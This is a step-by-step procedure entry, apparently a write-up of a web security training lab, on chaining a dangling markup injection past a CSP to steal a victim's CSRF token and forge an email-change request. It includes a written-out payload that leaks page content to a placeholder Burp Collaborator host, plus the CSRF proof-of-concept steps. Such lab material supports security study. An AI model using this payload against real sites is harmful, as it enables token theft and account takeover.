---
id: 9565fef6-a75c-44a7-833b-baf488ef0fdc
name: Reflected XSS Protected By CSP With Dangling Markup Attack
type: procedure
verified: true
submitted: true
created_at: '2020-08-24T16:31:11.852843+00:00'
updated_at: '2023-05-26T01:09:47.716862+00:00'
platforms:
- Web
tags:
- '[[CSRF]]'
- '[[Web Applications]]'
---

# Reflected XSS Protected By CSP With Dangling Markup Attack

**Status**: ✓ Verified

## Summary

Dangling markup injection attack technique is used where a XSS attack isnt possible. 

## Description

# Description

Dangling markup injection attack technique is used where a XSS attack isnt possible. 



# Instructions



1.Login to the application .







![62cd68fc-e320-4107-815b-d3adb4b7daab.png]()







2.Use Burp professional ,launch burp collaborator 





![4777ef4d-4fec-46f4-b8b4-217529d9bd5f.png]()





3.Click on *copy to clipboard* to copy the unique collaborator url.





![9dabf969-ce77-4282-b1b7-9ddd2044d095.png]()







4.Craft a exploit with the following payload and submit the exploit to the server.Deliver the exploit to the victim . 



payload : 

*<script>
location='https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>*





![99ec7fe0-e8f0-4e51-a087-2f38d9e903b0.png]()







5. Go back to collaborator window and click on poll now to generate responses from the application. 





![22be4a96-5679-4b2e-859e-963b815164de.png]()





6. Observe the HTTP response in the collaborator window and copy the user's CSRF token.





![54174e0f-f02f-44f7-a03f-528d6992372d.png]()







7.Submit the request to change email to some random address with burp's intercept on.







![5e0926cd-b1c4-4313-a56d-26dbcd23eb75.png]()





8.change the value of email parameter in the burp's intercept as below.





![d7ca030e-66c7-48d0-b2a9-42b5fb3073d1.png]()





9.Right click on the aboe request and select* CSRF PoC generator* form *engagement tools*. 





![45b90aef-b6cd-40e1-93c2-e39d792c26fa.png]()







10. Click on *options *and make sure that the* include auto-submit* script is selected.





![a0832875-ee0b-49f8-a382-db044c824d8f.png]()





11. Click on *regenerate* to change the CSRF token to the stolen token from burp collaborator and then click *copyHTML*. Go back to the exploit server in step 4 and paste the CSRF HTML generated from above step. Deliver the form to the victim . Upon clicking the xploit the user's emailId changes to the email present in the exploit.





![64d856fb-01b8-4f7f-a846-1ab05923b411.png]()



## Platforms

- Web

## Tags

- [[CSRF]]
- [[Web Applications]]


